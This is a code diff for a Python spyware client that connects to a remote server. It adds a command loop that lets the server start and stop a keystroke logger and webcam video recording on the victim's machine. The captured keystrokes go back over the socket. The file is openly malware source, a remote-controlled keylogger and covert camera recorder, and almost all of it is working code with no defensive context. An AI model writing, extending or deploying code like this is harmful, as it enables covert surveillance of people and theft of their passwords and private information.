@@ -14,6 +14,35 @@ SEND_REPORT_EVERY = 10  # in seconds
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 
+cap = None
+
+def handle_server_commands():
+    global cap
+    while True:
+            command = s.recv(BUFFER_SIZE).decode()
+            if command == "START_KEYLOGGER":
+                if not keylogger_thread.is_alive():
+                    keylogger_thread.start()
+                    print(f"Keylogger started")
+            elif command == "STOP_KEYLOGGER":
+                if keylogger_thread.is_alive():
+                    keyboard.unhook_all()
+                    print(f"Keylogger stopped")
+            elif command == "START_VIDEO":
+                if not recording_thread.is_alive():
+                    cap = cv2.VideoCapture(0)
+                    recording_thread.start()
+                    print(f"Video recording started")
+            elif command == "STOP_VIDEO":
+                if recording_thread.is_alive():
+                    cap.release()
+                    cv2.destroyAllWindows()
+                    print(f"Video recording stopped")
+            elif command == "EXIT":
+                s.close()
+                break
+
+
 class Keylogger:
     def __init__(self, interval, server_socket, report_method="file"):
         self.interval = interval
@@ -90,12 +119,10 @@ def record_video():
 
 # Start recording video in a separate thread.
 recording_thread = threading.Thread(target=record_video)
-recording_thread.start()
 
 # Start keylogger in a separate thread.
 keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s, report_method="file")
 keylogger_thread = threading.Thread(target=keylogger.start)
-keylogger_thread.start()
 
 recording_thread.join()
 keylogger_thread.join()
